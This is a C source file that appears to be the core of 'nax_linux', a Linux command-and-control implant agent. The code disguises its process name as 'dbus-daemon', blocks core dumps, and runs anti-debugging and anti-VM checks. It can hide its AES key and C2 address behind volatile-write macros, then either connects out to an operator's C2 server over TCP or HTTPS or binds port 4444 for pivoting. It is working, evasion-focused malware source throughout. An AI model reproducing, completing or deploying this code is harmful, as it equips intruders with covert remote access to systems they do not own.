/* nax_linux/src/agent.c — Agent core logic
 *
 * Contains all initialization, configuration, and transport dispatch.
 * Called by main.c (ELF executable) or shared.c (.so library). */

#include "nax_linux.h"
#ifdef __has_include
#  if __has_include("nax_config.h")
#    include "nax_config.h"
#  endif
#endif
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <sys/prctl.h>
#include <unistd.h>
#include "opsec.h"

/* FAKE_COMM_NAME built at runtime via volatile writes — see nax_config.h */

/* forwards */
void nax_tcp_main(NaxAgent *a);       /* tcp.c      — connect-out */
void nax_https_main(NaxAgent *a);     /* https.c    — HTTPS connect-out */
void nax_tcp_bind_main(NaxAgent *a);  /* tcp_bind.c — bind/pivot  */

/* ===== parse hex AES key ===== */
static int hex_to_bytes(const char *hex, uint8_t *out, size_t out_len)
{
    if (strlen(hex) != out_len * 2) return -1;
    for (size_t i = 0; i < out_len; i++) {
        unsigned int b;
        if (sscanf(hex + 2 * i, "%02x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return 0;
}

/* ===== Agent entry point — called from main.c or shared.c ===== */
int agent_run(void)
{

    srand((unsigned int)time(NULL));
    {
        char _comm[32] = {0};
#ifdef NAX_COMM_NAME_WRITE
        volatile char *_cp = (volatile char *)_comm;
        NAX_COMM_NAME_WRITE(_cp);
#else
        _comm[0]='d';_comm[1]='b';_comm[2]='u';_comm[3]='s';
        _comm[4]='-';_comm[5]='d';_comm[6]='a';_comm[7]='e';
        _comm[8]='m';_comm[9]='o';_comm[10]='n';
#endif
        prctl(PR_SET_NAME, _comm, 0, 0, 0);
    }
    signal(SIGPIPE, SIG_IGN);

    prctl(PR_SET_DUMPABLE, 0);

    /* OPSEC: anti-debug, anti-VM checks. Exits silently if hostile. */
    nax_opsec_check();

    NaxAgent agent = {0};
    agent.pivot_head = NULL;

    /* ===== Compile-time defaults ===== */
#ifndef NAX_AES_KEY
#  define NAX_AES_KEY "00000000000000000000000000000000"
#endif
#ifndef NAX_LISTENER_WM
#  define NAX_LISTENER_WM 0xDEADBEEFu
#endif
#ifndef NAX_SLEEP_MS
#  define NAX_SLEEP_MS 0u
#endif
#ifndef NAX_JITTER_PCT
#  define NAX_JITTER_PCT 20u
#endif

    agent.cfg.sleep_ms   = NAX_SLEEP_MS;
    agent.cfg.jitter_pct = NAX_JITTER_PCT;
    agent.cfg.wm         = NAX_LISTENER_WM;

#ifdef NAX_AES_KEY_WRITE
    {
        volatile uint8_t *k = (volatile uint8_t *)agent.cfg.aes_key;
        NAX_AES_KEY_WRITE( k );
    }
#else
    if (hex_to_bytes(NAX_AES_KEY, agent.cfg.aes_key, NAX_AES_KEY_SIZE) < 0) {
        return 1;
    }
#endif

    /* ===== Select transport mode ===== */
#if defined(NAX_TCP_MODE_BIND)

    /* ---- Bind / pivot mode ---- */
#ifndef NAX_BIND_PORT
#  define NAX_BIND_PORT 4444
#endif
    agent.cfg.bind_port = NAX_BIND_PORT;
    nax_tcp_bind_main(&agent);

#else /* default: connect-out */

    /* ---- Connect-out mode ---- */
#ifndef NAX_C2_HOST
#  define NAX_C2_HOST "127.0.0.1"
#endif
#ifndef NAX_C2_PORT
#  define NAX_C2_PORT 4444
#endif
#ifdef NAX_C2_HOST_WRITE
    {
        volatile char *h = (volatile char *)agent.cfg.c2_host;
        NAX_C2_HOST_WRITE( h );
        h[NAX_C2_HOST_LEN] = '\0';
    }
    {
        volatile uint8_t *pp = (volatile uint8_t *)&agent.cfg.c2_port;
        NAX_C2_PORT_WRITE( pp );
    }
#else
    strncpy(agent.cfg.c2_host, NAX_C2_HOST, sizeof(agent.cfg.c2_host) - 1);
    agent.cfg.c2_port = NAX_C2_PORT;
#endif
    agent.running = true;

#if defined(NAX_HTTPS_MODE)
    nax_https_main(&agent);
#else
    nax_tcp_main(&agent);
#endif

#endif /* NAX_TCP_MODE_BIND */
    nax_opsec_cleanup();
    return 0;
}
